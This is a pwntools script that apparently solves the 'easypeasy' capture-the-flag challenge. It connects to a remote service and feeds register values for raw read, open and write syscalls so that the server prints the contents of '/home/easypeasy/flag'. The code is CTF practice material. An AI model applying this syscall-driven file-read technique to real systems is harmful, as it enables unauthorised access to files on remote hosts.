
from pwn import *

binary = ELF("easypeasy")
context.binary = binary

if True:
    io = remote("35.200.228.122", 1337)
else:
    # context.log_level = "debug"
    context.terminal = ['tmux', 'splitw', '-h']
    io = binary.process()


def syscall(rax=0, rdi=0, rsi=0, rdx=0, rcx=0, r8=0, r9=0):
    io.sendlineafter("RAX: ", str(rax))
    io.sendlineafter("RDI: ", str(rdi))
    io.sendlineafter("RSI: ", str(rsi))
    io.sendlineafter("RDX: ", str(rdx))
    io.sendlineafter("RCX: ", str(rcx))
    io.sendlineafter("R8: ", str(r8))
    io.sendlineafter("R9: ", str(r9))


flag = 0x601400
syscall(0, 0, flag, 20)
io.send("/home/easypeasy/flag")
syscall(2, flag, 0, 0)
syscall(0, 3, flag+0x100, 0x100)
syscall(1, 1, flag+0x100, 0x100)

io.interactive()
